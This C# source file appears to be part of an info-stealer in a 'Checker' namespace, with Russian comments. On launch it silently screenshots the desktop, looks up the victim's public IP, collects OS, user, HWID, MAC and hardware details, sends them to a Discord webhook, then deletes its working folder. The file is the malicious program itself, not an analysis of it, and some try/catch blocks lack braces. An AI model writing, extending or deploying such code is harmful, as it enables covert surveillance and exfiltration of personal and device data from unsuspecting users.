using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Checker
{
    class Program
    {
        public static void Main(string[] args)
        {
            if (!File.Exists(Help.ExploitDir))
            {
                if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1)
                {
                    try
                    {
                        Directory.CreateDirectory(Help.ExploitDir);
                        List<Thread> Threads = new List<Thread>();
                        string ip = "";
                        Threads.Add(new Thread(() =>
                        {
                            Screen.GetScreen(); // Скриншот экрана 
                            var ips = new System.Net.WebClient();
                            ip = ips.DownloadString("https://api.ipify.org");
                        }));
                        foreach (Thread t in Threads)
                            t.Start();
                        foreach (Thread t in Threads)
                            t.Join();
                        string mssgBody =
                     "\n :eye: SteamID: " + "Null  / " + "Name: " + "Null"/*Потом просто с клиента возьму */ +
                     "\n :eye: IP: " + ip +
                     "\n :desktop: :desktop: :desktop: :desktop: :desktop: :desktop: :desktop: :desktop: :desktop: :desktop: :desktop: :desktop:" +
                     "\n ---------------------------------------------" +
                     "\n Операционка: " + SystemInfo.GetSystemVersion() +
                     "\n PC: " + SystemInfo.compname + "/" + SystemInfo.username +
                     "\n Размер экрана: " + SystemInfo.ScreenMetrics() +
                     "\n Время: " + DateTime.Now +
                     "\n ---------------------------------------------" +
                     "\n HWID: " + SystemInfo.GetHWID() +
                     "\n DiskDrive: " + SystemInfo.GetDisk() +
                     "\n CPU: " + SystemInfo.GetCPU() +
                     "\n RAM: " + SystemInfo.GetRAM() +
                     "\n SMBIOS: " + SystemInfo.GetSMBIOS() +
                     "\n MAC: " + SystemInfo.GetMAC() +
                     "\n PhysicalMemory: " + SystemInfo.GetPhysicalMemory() +
                     "\n GPU: " + SystemInfo.GetGPU();   
                        try
                            DiscordWebhook.SendFile(mssgBody, "Check.png", "png", Help.ExploitDir + "\\Screen.png", "");
                        catch
                            DiscordWebhook.Send("Скриншот много весит, не удалось отправить...");
                        Thread.Sleep(50000);
                        Directory.Delete(Help.ExploitDir + "\\", true);
                    }
                    catch (Exception e)
                        Console.WriteLine(e);
                }
            }
        } 
    }
}
